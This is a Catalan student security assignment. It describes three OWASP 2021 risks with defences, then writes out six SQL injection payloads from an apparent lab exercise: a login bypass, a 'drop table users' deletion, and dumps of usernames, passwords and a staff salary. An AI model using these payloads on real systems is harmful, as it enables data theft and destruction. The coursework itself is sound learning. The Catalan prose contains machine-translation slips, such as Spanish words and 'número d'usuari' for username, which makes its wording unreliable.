## T1. PR1. Seguretat i vulnerabilitat


#### 1. a. Escull 3 vulnerabilitats d’aquesta llista i descriu-les. Escriu l’impacte que tenen a la seguretat i quins danys pot arribar a fer un atac en aquesta vulnerabilitat. Enumera diferents mesures i tècniques per poder evitar-les.
1. Pèrdua de Control d'Accés (A01:2021)
Això passa quan els controls d'accés no estan ben posats i algú que no deuria acaba entrant a dades o funcions restringides. Un atacant podria veure, canviar o esborrar informació sensible, o fins i tot usar funcions d'administrador sense permís. Això ho fa súper perillós per a la seguretat. Per a evitar-ho, cal usar el "mínim privilegi", que significa donar a cada usuari sol l'accés que necessita. També es poden posar llistes de control d'accés (ACL) ben definides i fer proves de tant en tant per a trobar i arreglar fallades.

2. Fallades Criptogràfiques (A02:2021)
Aquí el problema és que el xifratge, que serveix per a protegir dades sensibles, està mal fet o usa mètodes febles. Si un atacant el trenca, pot veure informació privada com a contrasenyes o dades personals, i això porta a violacions de privacitat o pèrdues de diners. La solució és xifrar les dades sempre, ja sigui quan es mouen o quan estan guardats, usant algorismes forts. Res d'usar mètodes vells o trencats. També cal generar, guardar i canviar les claus de xifratge amb cura.

3. Injecció (A03:2021)
Això ocorre quan dades dolentes es fiquen en un sistema, com en una consulta a una base de dades, i el programa els pren com a comandos vàlids. Un atacant podria accedir a dades que no deuria, canviar informació o fins a prendre control del sistema. És un risc gran. Per a prevenir-ho, cal revisar i netejar tot el que entra des de l'usuari. Usar consultes parametritzades ajuda al fet que les bases de dades no es confonguin amb dades rares. També es poden usar eines d'anàlisi estàtica i dinàmica per a buscar aquests errors en el codi.

#### 2. 

SELECT username FROM users WHERE username ='jane';--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
Això busca el número d'usuari "jane" en la taula "users". El "--" fa que tot el que ve després (la part del password) s'ignori, com un comentari. Al final, vaig aconseguir treure només el username de "jane" si existeix, sense que el password importo.

SELECT username FROM users WHERE username =''; drop table users;--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
Aquí vaig intentar una mica més heavy. El "drop table users" després del ";" intenta esborrar la taula "users" sencera. Si el sistema no està protegit, vaig aconseguir eliminar totes les dades d'usuaris. El "--" altra vegada ignora això del password.

SELECT username FROM users WHERE username =''; select username from users;--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
Això executa dues consultes. La primera no retorna nata (username buit), però la segona ("select username from users") saca tots els números d'usuari de la taula. Vaig aconseguir una llista completa d'usuaris, com per a iniciar sessió con qualsevol després

SELECT username FROM users WHERE username =''; Select username from users límite 1;--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
Semblança a l'anterior, però con "límit 1" en la segona consulta, només retorna un usuari. Sembla que algú va arreglar el sistema perquè no tregui tots els usuaris, així que vaig aconseguir només un username, suficient per a intentar entrar con aquest.

SELECT product_*id, brand, size, price FROM shoes WHERE brand='';select username,password from users--';
Això comença com una consulta normal de la taula "shoes", però després del ";"
vaig ficar una segona consulta que saca números d'usuari i contrasenyes de la taula "users". Vaig aconseguir una llista de credencials completa, encara que la consulta inicial no retornés nada por el brand buit.

SELECT username FROM users WHERE username =''; SELECT salary AS username FROM staff WHERE firstname='*Greta Maria'; AND password ='d41d8cd98f00b204e9800998ecf8427e';
Aquí volia saber quant fam "Greta Maria" del personal. La segona consulta usa "AS username" per a canviar de nom la columna "salary" com "username". Si funciona, vaig aconseguir el salari de Greta Maria, encara que la primera consulta no faci nata útil. L'"AND password" no afecta perquè està després del ";".
